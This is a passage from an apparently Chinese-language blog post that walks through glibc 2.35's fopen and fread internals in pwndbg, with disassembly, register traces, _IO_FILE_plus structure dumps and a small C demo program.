&lt;_IO_file_open+52&gt;    mov    edx, ebp                         EDX =&gt; 4</span><br><span class="line">0x7ffff7c8c0c6 &lt;_IO_file_open+54&gt;    and    ebp, 0x1004                      EBP =&gt; 4 (0x4 &amp; 0x1004)</span><br><span class="line">0x7ffff7c8c0cc &lt;_IO_file_open+60&gt;    mov    dword ptr [rbx + 0x70], r12d     [0x555555559310] &lt;= 3</span><br><span class="line">0x7ffff7c8c0d0 &lt;_IO_file_open+64&gt;    and    edx, 0x100c                      EDX =&gt; 4 (0x4 &amp; 0x100c)</span><br><span class="line">0x7ffff7c8c0d6 &lt;_IO_file_open+70&gt;    and    eax, 0xffffeff3                  EAX =&gt; 0xfbad2480 (0xfbad248c &amp; 0xffffeff3)</span><br><span class="line">0x7ffff7c8c0db &lt;_IO_file_open+75&gt;    or     eax, edx                         EAX =&gt; 0xfbad2484 (0xfbad2480 | 0x4)</span><br><span class="line">0x7ffff7c8c0dd &lt;_IO_file_open+77&gt;     mov    dword ptr [rbx], eax             [0x5555555592a0] &lt;= 0xfbad2484</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$11 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见<code>_fileno</code>已经被设置为3，<code>_IO_file_fopen</code>函数还设置了缓冲区等<br>后续再次调用<code>_IO_link_in</code>，应该是确保结构体状态的更新<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c0df &lt;_IO_file_open+79&gt;     cmp    ebp, 0x1004                      0x4 - 0x1004     EFLAGS =&gt; 0x287 [ CF PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8c0e5 &lt;_IO_file_open+85&gt;   ✔ jne    _IO_file_open+144           &lt;_IO_file_open+144&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8c120 &lt;_IO_file_open+144&gt;    mov    rdi, rbx                 RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8c123 &lt;_IO_file_open+147&gt;    call   _IO_link_in                 &lt;_IO_link_in&gt;</span><br></pre></td></tr></table></figure><p>后续调用了一些字符串解析函数，最后回到<code>_IO_new_fopen</code>函数，最后回到main函数结束<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f6b3 &lt;fopen64+131&gt;    test   byte ptr [rbx + 0x74], 1     0 &amp; 1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c7f6b7 &lt;fopen64+135&gt;  ✔ je     fopen64+189                 &lt;fopen64+189&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c7f6ed &lt;fopen64+189&gt;    add    rsp, 8       RSP =&gt; 0x7fffffffdca8 (0x7fffffffdca0 + 0x8)</span><br><span class="line">0x7ffff7c7f6f1 &lt;fopen64+193&gt;    mov    rax, r12     RAX =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c7f6f4 &lt;fopen64+196&gt;    pop    rbx          RBX =&gt; 0</span><br><span class="line">0x7ffff7c7f6f5 &lt;fopen64+197&gt;    pop    rbp          RBP =&gt; 0x7fffffffdce0</span><br><span class="line">0x7ffff7c7f6f6 &lt;fopen64+198&gt;    pop    r12          R12 =&gt; 0x7fffffffddf8</span><br><span class="line">0x7ffff7c7f6f8 &lt;fopen64+200&gt;    pop    r13          R13 =&gt; 0x555555555169 (main)</span><br><span class="line">0x7ffff7c7f6fa &lt;fopen64+202&gt;    ret                                &lt;main+37&gt;</span><br></pre></td></tr></table></figure><p>看最终返回的<code>_IO_FILE_plus</code>结构体<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$15 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-fread函数"><a href="#0x03-fread函数" class="headerlink" title="0x03 fread函数"></a>0x03 fread函数</h2><p>继续用fopen使用的demo，加一个fread函数即可（glibc2.35）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    fread(ptr, <span class="number">1</span>, <span class="number">20</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fread下个断点，查看其汇编代码如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_fread:</span><br><span class="line">Address range 0x7ffff7c7fb30 to 0x7ffff7c7fc2e:</span><br><span class="line">=&gt; 0x00007ffff7c7fb30 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7fb34 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c7fb36 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c7fb38 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c7fb3a &lt;+10&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c7fb3c &lt;+12&gt;:    mov    r12,rsi</span><br><span class="line">   0x00007ffff7c7fb3f &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c7fb40 &lt;+16&gt;:    imul   r12,rdx</span><br><span class="line">   0x00007ffff7c7fb44 &lt;+20&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7fb45 &lt;+21&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c7fb49 &lt;+25&gt;:    test   r12,r12</span><br><span class="line">   0x00007ffff7c7fb4c &lt;+28&gt;:    je     0x7ffff7c7fbe1 &lt;__GI__IO_fread+177&gt;</span><br><span class="line">   0x00007ffff7c7fb52 &lt;+34&gt;:    mov    eax,DWORD PTR [rcx]</span><br><span class="line">   0x00007ffff7c7fb54 &lt;+36&gt;:    mov    r14,rdi</span><br><span class="line">   0x00007ffff7c7fb57 &lt;+39&gt;:    mov    rbp,rsi</span><br><span class="line">   0x00007ffff7c7fb5a &lt;+42&gt;:    mov    r13,rdx</span><br><span class="line">   0x00007ffff7c7fb5d &lt;+45&gt;:    mov    rbx,rcx</span><br><span class="line">   0x00007ffff7c7fb60 &lt;+48&gt;:    and    eax,0x8000</span><br><span class="line">   0x00007ffff7c7fb65 &lt;+53&gt;:    jne    0x7ffff7c7fb9b &lt;__GI__IO_fread+107&gt;</span><br><span class="line">   0x00007ffff7c7fb67 &lt;+55&gt;:    mov    r15,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c7fb70 &lt;+64&gt;:    mov    rdi,QWORD PTR [rcx+0x88]</span><br><span class="line">   0x00007ffff7c7fb77 &lt;+71&gt;:    cmp    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7fb7b &lt;+75&gt;:    je     0x7ffff7c7fb97 &lt;__GI__IO_fread+103&gt;</span><br><span class="line">   0x00007ffff7c7fb7d &lt;+77&gt;:    mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7fb82 &lt;+82&gt;:    lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7fb86 &lt;+86&gt;:    jne    0x7ffff7c7fc18 &lt;__GI__IO_fread+232&gt;</span><br><span class="line">   0x00007ffff7c7fb8c &lt;+92&gt;:    mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7fb93 &lt;+99&gt;:    mov    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7fb97 &lt;+103&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7fb9b &lt;+107&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c7fb9e &lt;+110&gt;:   mov    rsi,r14</span><br><span class="line">   0x00007ffff7c7fba1 &lt;+113&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7fba4 &lt;+116&gt;:   call   0x7ffff7c8dfd0 &lt;__GI__IO_sgetn&gt;</span><br><span class="line">   0x00007ffff7c7fba9 &lt;+121&gt;:   test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c7fbaf &lt;+127&gt;:   jne    0x7ffff7c7fbd4 &lt;__GI__IO_fread+164&gt;</span><br><span class="line">   0x00007ffff7c7fbb1 &lt;+129&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7fbb8 &lt;+136&gt;:   mov    ecx,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c7fbbb &lt;+139&gt;:   lea    edx,[rcx-0x1]</span><br><span class="line">   0x00007ffff7c7fbbe &lt;+142&gt;:   mov    DWORD PTR [rdi+0x4],edx</span><br><span class="line">   0x00007ffff7c7fbc1 &lt;+145&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c7fbc3 &lt;+147&gt;:   jne    0x7ffff7c7fbd4 &lt;__GI__IO_fread+164&gt;</span><br><span class="line">   0x00007ffff7c7fbc5 &lt;+149&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c7fbcd &lt;+157&gt;:   xchg   DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7fbcf &lt;+159&gt;:   cmp    edx,0x1</span><br><span class="line">   0x00007ffff7c7fbd2 &lt;+162&gt;:   jg     0x7ffff7c7fc00 &lt;__GI__IO_fread+208&gt;</span><br><span class="line">   0x00007ffff7c7fbd4 &lt;+164&gt;:   cmp    r12,rax</span><br><span class="line">   0x00007ffff7c7fbd7 &lt;+167&gt;:   je     0x7ffff7c7fbf8 &lt;__GI__IO_fread+200&gt;</span><br><span class="line">   0x00007ffff7c7fbd9 &lt;+169&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c7fbdb &lt;+171&gt;:   div    rbp</span><br><span class="line">   0x00007ffff7c7fbde &lt;+174&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c7fbe1 &lt;+177&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c7fbe5 &lt;+181&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c7fbe8 &lt;+184&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7fbe9 &lt;+185&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7fbea &lt;+186&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7fbec &lt;+188&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c7fbee &lt;+190&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c7fbf0 &lt;+192&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c7fbf2 &lt;+194&gt;:   ret</span><br><span class="line">   0x00007ffff7c7fbf3 &lt;+195&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7fbf8 &lt;+200&gt;:   mov    r12,r13</span><br><span class="line">   0x00007ffff7c7fbfb &lt;+203&gt;:   jmp    0x7ffff7c7fbe1 &lt;__GI__IO_fread+177&gt;</span><br><span class="line">   0x00007ffff7c7fbfd &lt;+205&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c7fc00 &lt;+208&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c7fc05 &lt;+213&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c7fc0a &lt;+218&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c7fc0f &lt;+223&gt;:   jmp    0x7ffff7c7fbd4 &lt;__GI__IO_fread+164&gt;</span><br><span class="line">   0x00007ffff7c7fc11 &lt;+225&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c7fc18 &lt;+232&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c7fc1d &lt;+237&gt;:   jmp    0x7ffff7c7fb8c &lt;__GI__IO_fread+92&gt;</span><br><span class="line">   0x00007ffff7c7fc22 &lt;+242&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c7fc26 &lt;+246&gt;:   mov    rbp,rax</span><br><span class="line">   0x00007ffff7c7fc29 &lt;+249&gt;:   jmp    0x7ffff7c2910f &lt;__GI__IO_fread.cold&gt;</span><br><span class="line">Address range 0x7ffff7c2910f to 0x7ffff7c29145:</span><br><span class="line">   0x00007ffff7c2910f &lt;-354849&gt;:        test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c29115 &lt;-354843&gt;:        jne    0x7ffff7c2913d &lt;__GI__IO_fread-354803&gt;</span><br><span class="line">   0x00007ffff7c29117 &lt;-354841&gt;:        mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c2911e &lt;-354834&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c29121 &lt;-354831&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29124 &lt;-354828&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c29127 &lt;-354825&gt;:        jne    0x7ffff7c2913d &lt;__GI__IO_fread-354803&gt;</span><br><span class="line">   0x00007ffff7c29129 &lt;-354823&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c29131 &lt;-354815&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c29133 &lt;-354813&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29136 &lt;-354810&gt;:        jle    0x7ffff7c2913d &lt;__GI__IO_fread-354803&gt;</span><br><span class="line">   0x00007ffff7c29138 &lt;-354808&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c2913d &lt;-354803&gt;:        mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c29140 &lt;-354800&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可以看到fread函数最起初实际上是<code>_IO_fread</code>函数，先计算需要读取的字节数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7fb34 &lt;fread+4&gt;     push   r15</span><br><span class="line">0x7ffff7c7fb36 &lt;fread+6&gt;     push   r14</span><br><span class="line">0x7ffff7c7fb38 &lt;fread+8&gt;     push   r13</span><br><span class="line">0x7ffff7c7fb3a &lt;fread+10&gt;    push   r12</span><br><span class="line">0x7ffff7c7fb3c &lt;fread+12&gt;    mov    r12, rsi      R12 =&gt; 1</span><br><span class="line">0x7ffff7c7fb3f &lt;fread+15&gt;    push   rbp</span><br><span class="line">0x7ffff7c7fb40 &lt;fread+16&gt;    imul   r12, rdx</span><br><span class="line">0x7ffff7c7fb44 &lt;fread+20&gt;    push   rbx</span><br><span class="line">0x7ffff7c7fb45 &lt;fread+21&gt;    sub    rsp, 0x18     RSP =&gt; 0x7fffffffdca0 (0x7fffffffdcb8 - 0x18)</span><br><span class="line">0x7ffff7c7fb49 &lt;fread+25&gt;    test   r12, r12      0x14 &amp; 0x14     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7fb4c &lt;fread+28&gt;  ✘ je     fread+177                   &lt;fread+177&gt;</span><br></pre></td></tr></table></figure><p>看到<code>imul   r12, rdx</code>计算得到了需要读取的字节数（0x14正是demo中需要读取的字节数20），如果不为0则继续，为0则直接返回<br>接下来是针对<code>_flags</code>域进行了一些有关锁的操作，然后调用<code>_IO_sgetn</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7fb9b &lt;fread+107&gt;    mov    rdx, r12     RDX =&gt; 0x14</span><br><span class="line">0x7ffff7c7fb9e &lt;fread+110&gt;    mov    rsi, r14     RSI =&gt; 0x555555559480 ◂— 0</span><br><span class="line">0x7ffff7c7fba1 &lt;fread+113&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c7fba4 &lt;fread+116&gt;    call   _IO_sgetn                   &lt;_IO_sgetn&gt;</span><br></pre></td></tr></table></figure><p>先放上<code>_IO_sgetn</code>的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_sgetn:</span><br><span class="line">   0x00007ffff7c8dfd0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8dfd4 &lt;+4&gt;:     push   rbx</span><br><span class="line">   0x00007ffff7c8dfd5 &lt;+5&gt;:     lea    rcx,[rip+0x188a24]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8dfdc &lt;+12&gt;:    lea    rax,[rip+0x189785]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8dfe3 &lt;+19&gt;:    sub    rax,rcx</span><br><span class="line">   0x00007ffff7c8dfe6 &lt;+22&gt;:    sub    rsp,0x20</span><br><span class="line">   0x00007ffff7c8dfea &lt;+26&gt;:    mov    rbx,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7c8dff1 &lt;+33&gt;:    mov    r8,rbx</span><br><span class="line">   0x00007ffff7c8dff4 &lt;+36&gt;:    sub    r8,rcx</span><br><span class="line">   0x00007ffff7c8dff7 &lt;+39&gt;:    cmp    rax,r8</span><br><span class="line">   0x00007ffff7c8dffa &lt;+42&gt;:    jbe    0x7ffff7c8e010 &lt;__GI__IO_sgetn+64&gt;</span><br><span class="line">=&gt; 0x00007ffff7c8dffc &lt;+44&gt;:    mov    rax,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8e000 &lt;+48&gt;:    add    rsp,0x20</span><br><span class="line">   0x00007ffff7c8e004 &lt;+52&gt;:    pop    rbx</span><br><span class="line">   0x00007ffff7c8e005 &lt;+53&gt;:    jmp    rax</span><br><span class="line">   0x00007ffff7c8e007 &lt;+55&gt;:    nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8e010 &lt;+64&gt;:    mov    QWORD PTR [rsp+0x18],rdx</span><br><span class="line">   0x00007ffff7c8e015 &lt;+69&gt;:    mov    QWORD PTR [rsp+0x10],rsi</span><br><span class="line">   0x00007ffff7c8e01a &lt;+74&gt;:    mov    QWORD PTR [rsp+0x8],rdi</span><br><span class="line">   0x00007ffff7c8e01f &lt;+79&gt;:    call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8e024 &lt;+84&gt;:    mov    rax,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8e028 &lt;+88&gt;:    mov    rdx,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00007ffff7c8e02d &lt;+93&gt;:    mov    rsi,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x00007ffff7c8e032 &lt;+98&gt;:    mov    rdi,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8e037 &lt;+103&gt;:   add    rsp,0x20</span><br><span class="line">   0x00007ffff7c8e03b &lt;+107&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8e03c &lt;+108&gt;:   jmp    rax</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试，<code>_IO_sgetn</code>先进行安全检测<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dfd4 &lt;_IO_sgetn+4&gt;     push   rbx</span><br><span class="line">► 0x7ffff7c8dfd5 &lt;_IO_sgetn+5&gt;     lea    rcx, [rip + 0x188a24]           RCX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dfdc &lt;_IO_sgetn+12&gt;    lea    rax, [rip + 0x189785]           RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8dfe3 &lt;_IO_sgetn+19&gt;    sub    rax, rcx                        RAX =&gt; 0xd68 (0x7ffff7e17768 - 